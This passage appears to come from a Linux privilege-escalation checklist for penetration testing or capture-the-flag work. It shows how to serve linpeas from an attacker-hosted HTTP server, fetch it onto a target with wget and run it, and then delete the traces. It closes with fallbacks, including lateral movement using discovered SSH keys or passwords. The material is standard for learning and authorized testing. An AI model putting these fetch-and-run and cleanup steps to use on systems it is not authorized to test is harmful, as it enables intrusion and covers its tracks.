## Step 18 — Automated enumeration (linpeas)

⚠️ Maximum IOC. Comprehensive backstop.

### Transfer:

On **attacker** (in the linpeas directory):

`python3 -m http.server 8000`

On target:

`wget http://<lhost>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`

### Run:

`/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out`

### Triage:

Focus on red+yellow flagged findings. Route each finding back to the appropriate step above (sudo / SUID / cron / etc.) for exploitation.

### Cleanup:

`rm /tmp/linpeas.sh /tmp/linpeas.out`

---

## Exhaustion

All nineteen steps fall through:

1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
3. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
